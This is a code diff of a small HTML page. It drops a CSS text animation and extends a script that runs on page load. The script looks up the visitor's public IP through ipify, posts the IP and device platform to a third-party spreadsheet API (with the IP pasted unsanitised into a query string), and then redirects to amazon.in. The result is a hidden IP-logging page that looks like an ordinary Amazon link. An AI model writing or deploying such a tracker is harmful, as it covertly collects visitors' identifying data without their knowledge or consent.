@@ -8,44 +8,6 @@
 
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
-    <style>
-        .box{
-            height:100vh;
-        }
-        .input-text-blinked{
-            font-size: 30px;
-            font-weight: 700;
-            position: relative;
-            overflow: hidden;
-        }
-        .input-text-blinked::after{
-            content: "";
-            width: 100%;
-            height: 100%;
-            position: absolute;
-            background-color: white;
-            border-left: 2px solid black;
-            top: 0;
-            left: 0;
-            animation: border-blink 0.5s 0.5s infinite,show-elements 7s infinite ;
-        }
-        @keyframes border-blink {
-            0% {
-                border:none ;
-            }
-            100% {
-                border-left-color: black;
-            }
-        }
-        @keyframes show-elements {
-            0% {
-                transform: translateX(0%);
-            }
-            100% {
-                transform: translate(100%);
-            }
-        }
-    </style>
   </head>
   <body>
     <!-- Optional JavaScript -->
@@ -57,16 +19,25 @@
         $(document).ready(()=>{
             $.getJSON('https://api.ipify.org?format=json', 
             function(data){
-                console.log(data);
                 fetch("https://api.apispreadsheets.com/data/I0eZip2rK05BeLnZ/", {
                     method: "POST",
-                    body: JSON.stringify({"data": {"Ip Address":data.ip}}),
+                    body: JSON.stringify({"data": {"Device":window.navigator.platform,"Ip Address":data.ip}, "query": `select * from I0eZip2rK05BeLnZ where Ip Address='${data.ip}'`}),
                 }).then(res =>{
                     if (res.status === 201){
-                        location.href = "https://www.amazon.in"
+                        location.href = "https://www.amazon.in";
                     }
                     else{
-                        location.reload;
+                        fetch("https://api.apispreadsheets.com/data/I0eZip2rK05BeLnZ/", {
+                            method: "POST",
+                            body: JSON.stringify({"data": {"Device":window.navigator.platform,"Ip Address":data.ip}}),
+                        }).then(res =>{
+                            if (res.status === 201){
+                                location.href = "https://www.amazon.in";
+                            }
+                            else{
+                                location.reload;
+                            }
+                        })
                     }
                 })
             });
